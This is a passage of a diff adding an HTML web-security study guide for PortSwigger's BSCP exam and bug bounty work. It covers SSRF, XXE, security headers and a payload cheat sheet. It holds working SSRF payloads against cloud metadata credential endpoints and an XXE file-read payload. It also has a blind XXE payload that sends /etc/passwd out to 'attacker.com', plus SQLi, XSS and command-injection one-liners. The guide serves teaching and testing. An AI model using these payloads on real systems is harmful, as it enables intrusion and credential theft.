+<span class="c"># INTRUDER ATTACK TYPES:</span>
+<span class="c"># Sniper    — one payload list, one position</span>
+<span class="c"># Battering Ram — same payload all positions</span>
+<span class="c"># Pitchfork — multiple lists, one per position (parallel)</span>
+<span class="c"># Cluster Bomb — all combinations (cross product)</span>
+
+<span class="c"># USEFUL EXTENSIONS (BApp Store):</span>
+<span class="c"># Logger++        — log all requests</span>
+<span class="c"># Autorize        — auto test access control</span>
+<span class="c"># JWT Editor      — manipulate JWTs</span>
+<span class="c"># Param Miner     — discover hidden parameters</span>
+<span class="c"># Active Scan++   — enhanced scanner</span>
+<span class="c"># Turbo Intruder  — fast brute force (Python scripts)</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════════
+     S8 · SSRF & XXE
+══════════════════════════════════════════════════ -->
+<section class="section" id="s8">
+  <div class="sec-kicker"><div class="sec-num">08</div><div class="sec-tag">OWASP A10 / A03</div></div>
+  <div class="sec-title">SSRF & XXE</div>
+  <p class="sec-deck">Server-Side Request Forgery forces the server to fetch attacker-controlled URLs — bypassing firewalls. XXE exploits XML parsers to read files and perform SSRF.</p>
+
+  <div class="g2">
+    <div>
+      <h3 style="font-family:var(--display);font-size:15px;letter-spacing:.08em;text-transform:uppercase;color:var(--ink);margin-bottom:12px">SSRF — Server-Side Request Forgery</h3>
+      <div class="diagram"><span class="dh">SSRF ATTACK FLOW</span>
+
+<span class="dd">Application:</span>
+<span class="db">POST /fetch-url</span>
+<span class="db">{"url": "https://api.partner.com/data"}</span>
+
+<span class="dd">Attacker changes URL to internal service:</span>
+<span class="dr">{"url": "http://169.254.169.254/metadata"}</span>  ← AWS metadata
+<span class="dr">{"url": "http://localhost/admin"}</span>
+<span class="dr">{"url": "http://10.0.0.1/internal-api"}</span>
+
+<span class="dd">Server fetches it → attacker gets internal data!</span></div>
+      <div class="payload"><span class="pl-label">// SSRF Payloads</span>
+http://127.0.0.1/
+http://localhost/admin
+http://[::1]/                    ← IPv6 loopback
+http://0.0.0.0/
+http://169.254.169.254/          ← AWS IMDS
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://metadata.google.internal/ ← GCP metadata
+http://100.100.100.200/          ← Alibaba Cloud
+
+<span class="pl-label">// SSRF Filter Bypass</span>
+http://evil.com@127.0.0.1        ← URL confusion
+http://127.0.0.1#.evil.com       ← fragment trick
+http://127。0。0。1               ← Unicode dots
+http://0x7f000001/               ← Hex IP = 127.0.0.1
+http://2130706433/               ← Decimal IP = 127.0.0.1</div>
+    </div>
+    <div>
+      <h3 style="font-family:var(--display);font-size:15px;letter-spacing:.08em;text-transform:uppercase;color:var(--ink);margin-bottom:12px">XXE — XML External Entity</h3>
+      <div class="payload"><span class="pl-label">// Basic XXE — read /etc/passwd</span>
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;
+  &lt;data&gt;&amp;xxe;&lt;/data&gt;
+&lt;/root&gt;
+
+<span class="pl-label">// XXE → SSRF (internal request)</span>
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/metadata"&gt;
+]&gt;
+
+<span class="pl-label">// Blind XXE — out-of-band data exfiltration</span>
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+  &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM
+    'https://attacker.com/?data=%file;'&gt;"&gt;
+  %eval;
+  %exfil;
+]&gt;
+
+<span class="pl-label">// XXE in JSON? Test switching Content-Type</span>
+Content-Type: application/xml
+&lt;?xml ...?&gt;</div>
+      <div class="note ng" style="margin-top:12px">
+        <div class="note-lbl">Defense</div>
+        Disable XML external entity processing in parsers. Use allowlists for SSRF — only permit specific, expected domains. Validate and sanitize all user-supplied URLs. Don't return server responses to client when fetching URLs.
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════════
+     S9 · SECURITY HEADERS
+══════════════════════════════════════════════════ -->
+<section class="section" id="s9">
+  <div class="sec-kicker"><div class="sec-num">09</div><div class="sec-tag">Defense</div></div>
+  <div class="sec-title">Security Headers</div>
+  <p class="sec-deck">HTTP response headers that instruct browsers to enforce security policies. Each mitigates a specific class of attack.</p>
+
+  <table class="dt">
+    <tr><th>Header</th><th>Attack Mitigated</th><th>Recommended Value</th></tr>
+    <tr><td><strong>Content-Security-Policy</strong></td><td>XSS, data injection</td><td class="mc">default-src 'self'; script-src 'self' 'nonce-{random}'</td></tr>
+    <tr><td><strong>Strict-Transport-Security</strong></td><td>Protocol downgrade, MITM</td><td class="mc">max-age=31536000; includeSubDomains; preload</td></tr>
+    <tr><td><strong>X-Frame-Options</strong></td><td>Clickjacking</td><td class="mc">DENY or SAMEORIGIN</td></tr>
+    <tr><td><strong>X-Content-Type-Options</strong></td><td>MIME sniffing</td><td class="mc">nosniff</td></tr>
+    <tr><td><strong>Referrer-Policy</strong></td><td>URL info leakage</td><td class="mc">no-referrer or strict-origin-when-cross-origin</td></tr>
+    <tr><td><strong>Permissions-Policy</strong></td><td>Feature abuse (camera, mic)</td><td class="mc">geolocation=(), microphone=(), camera=()</td></tr>
+    <tr><td><strong>Cache-Control</strong></td><td>Sensitive data caching</td><td class="mc">no-store (for sensitive pages)</td></tr>
+    <tr><td><strong>X-Powered-By</strong></td><td>Technology fingerprinting</td><td class="mc">Remove entirely</td></tr>
+    <tr><td><strong>Server</strong></td><td>Version fingerprinting</td><td class="mc">Remove or obscure</td></tr>
+  </table>
+
+  <div class="code">
+    <div class="code-bar"><div class="code-title">implementing security headers — Flask / Express / Nginx</div><div class="cb-right"><span class="code-lang">multi</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+    <pre><span class="c"># ── Flask (Python) ─────────────────────────────────────────</span>
+<span class="k">from</span> flask_talisman <span class="k">import</span> Talisman
+Talisman(app, content_security_policy={
+    <span class="s">'default-src'</span>: <span class="s">"'self'"</span>,
+    <span class="s">'script-src'</span>: [<span class="s">"'self'"</span>, <span class="s">'cdn.jsdelivr.net'</span>],
+    <span class="s">'style-src'</span>: [<span class="s">"'self'"</span>, <span class="s">'fonts.googleapis.com'</span>]
+})
+
+<span class="c"># ── Express.js (Node) ──────────────────────────────────────</span>
+<span class="k">const</span> helmet = require(<span class="s">'helmet'</span>);
+app.use(helmet());    <span class="c">// sets all security headers automatically</span>
+app.use(helmet.contentSecurityPolicy({
+  directives: {
+    defaultSrc: [<span class="s">"'self'"</span>],
+    scriptSrc: [<span class="s">"'self'"</span>, (req, res) =&gt; <span class="s">`'nonce-${res.locals.nonce}'`</span>]
+  }
+}));
+
+<span class="c"># ── Nginx config ───────────────────────────────────────────</span>
+add_header Strict-Transport-Security <span class="s">"max-age=31536000; includeSubDomains; preload"</span> always;
+add_header X-Frame-Options <span class="s">"DENY"</span> always;
+add_header X-Content-Type-Options <span class="s">"nosniff"</span> always;
+add_header Content-Security-Policy <span class="s">"default-src 'self'; script-src 'self'"</span> always;
+add_header Referrer-Policy <span class="s">"strict-origin-when-cross-origin"</span> always;
+server_tokens off;    <span class="c"># hide nginx version</span></pre>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════════
+     S10 · QUICK REFERENCE
+══════════════════════════════════════════════════ -->
+<section class="section" id="s10">
+  <div class="sec-kicker"><div class="sec-num">10</div><div class="sec-tag">Reference</div></div>
+  <div class="sec-title">Quick Reference & Cheatsheet</div>
+  <p class="sec-deck">Everything at a glance — recon tools, testing methodology, payload quick-reference, and exam checklist.</p>
+
+  <div class="g3">
+    <div class="mini">
+      <h4>Web Recon Toolkit</h4>
+      <div class="code" style="margin-top:8px">
+        <div class="code-bar"><div class="code-title">recon commands</div><div class="cb-right"><span class="code-lang">bash</span></div></div>
+        <pre style="font-size:11px"><span class="c"># Directory enumeration</span>
+gobuster dir -u URL -w wordlist
+ffuf -u URL/FUZZ -w wordlist
+feroxbuster -u URL
+
+<span class="c"># Subdomain discovery</span>
+subfinder -d target.com
+amass enum -d target.com
+dnsx -d target.com
+
+<span class="c"># Tech fingerprinting</span>
+whatweb https://target.com
+wappalyzer (browser ext)
+
+<span class="c"># Vulnerability scan</span>
+nikto -h https://target.com
+nuclei -u https://target.com</pre>
+      </div>
+    </div>
+    <div class="mini">
+      <h4>Testing Methodology</h4>
+      <ol style="padding-left:16px">
+        <li><strong>Recon</strong> — map app, find endpoints</li>
+        <li><strong>Auth test</strong> — login, register, reset</li>
+        <li><strong>Input</strong> — every param with SQLi/XSS</li>
+        <li><strong>Access control</strong> — IDOR, priv esc</li>
+        <li><strong>Business logic</strong> — workflow flaws</li>
+        <li><strong>Headers/crypto</strong> — SSL, cookies, CORS</li>
+        <li><strong>File upload</strong> — extension bypass</li>
+        <li><strong>API</strong> — hidden endpoints, verb tampering</li>
+      </ol>
+    </div>
+    <div class="mini">
+      <h4>One-Liner Payloads</h4>
+      <div style="font-family:var(--mono);font-size:10px;color:var(--crimson);line-height:1.9">
+        <div><span style="color:var(--faint)">SQLi:</span> ' OR 1=1--</div>
+        <div><span style="color:var(--faint)">XSS:</span> &lt;svg onload=alert(1)&gt;</div>
+        <div><span style="color:var(--faint)">Path:</span> ../../../etc/passwd</div>
+        <div><span style="color:var(--faint)">SSTI:</span> {{7*7}}</div>
+        <div><span style="color:var(--faint)">SSRF:</span> http://127.0.0.1/</div>
+        <div><span style="color:var(--faint)">CMDi:</span> ;id</div>
+        <div><span style="color:var(--faint)">LDAP:</span> *)(uid=*)</div>
+        <div><span style="color:var(--faint)">NoSQL:</span> {"$gt":""}</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Final checklist -->
+  <div style="margin-top:32px;background:var(--ink);padding:32px 36px;position:relative">
+    <div style="position:absolute;top:0;left:0;bottom:0;width:4px;background:var(--crimson)"></div>
+    <div style="font-family:var(--display);font-size:10px;letter-spacing:.28em;color:var(--crimson2);text-transform:uppercase;margin-bottom:18px">PortSwigger BSCP / Bug Bounty Readiness</div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
+      <div style="font-family:var(--body);font-size:13px;color:rgba(255,255,255,0.55);line-height:2.1">
+        ☐ Complete all OWASP Top 10 PortSwigger labs<br>
+        ☐ Exploit SQLi → dump database manually<br>
+        ☐ Steal cookies with stored XSS<br>
+        ☐ Forge CSRF PoC that transfers funds<br>
+        ☐ Bypass access control with IDOR<br>
+        ☐ Crack JWT with weak secret
+      </div>
+      <div style="font-family:var(--body);font-size:13px;color:rgba(255,255,255,0.55);line-height:2.1">
+        ☐ Read /etc/passwd via XXE<br>
+        ☐ Access AWS metadata via SSRF<br>
+        ☐ Set up Burp + proxy Firefox/Chrome<br>
+        ☐ Fuzz parameters with Intruder<br>
+        ☐ Write a pentest finding report<br>
+        ☐ Set all security headers correctly
+      </div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<script>
+// Sidebar nav
+function goS(id, el) {
+  document.getElementById(id)?.scrollIntoView({behavior:'smooth', block:'start'});
+  if(el) {
+    document.querySelectorAll('.sb-link').forEach(l => l.classList.remove('active'));
+    el.classList.add('active');
+  }
+}
+
+// Card toggles (owasp)
+function tog(id) {
+  const el = document.getElementById(id);
+  if(el) el.classList.toggle('open');
+}
+
+// Active section tracking
+const secs = document.querySelectorAll('section[id]');
+const links = document.querySelectorAll('.sb-link');
+secs.forEach(s => {
+  new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if(e.isIntersecting) {
+        const i = [...secs].indexOf(e.target);
+        links.forEach(l => l.classList.remove('active'));
+        if(links[i]) links[i].classList.add('active');
+      }
+    });
+  }, {threshold: 0.2}).observe(s);
+});
+
+// Copy buttons
+function cp(btn) {
+  const pre = btn.closest('.code')?.querySelector('pre');
+  if(!pre) return;
+  navigator.clipboard.writeText(pre.textContent.trim()).then(() => {
+    const o = btn.textContent;
+    btn.textContent = 'copied!'; btn.style.color = '#98d982';
+    setTimeout(() => { btn.textContent = o; btn.style.color = ''; }, 2000);
+  });
+}
+</script>
+</body>
 </html>
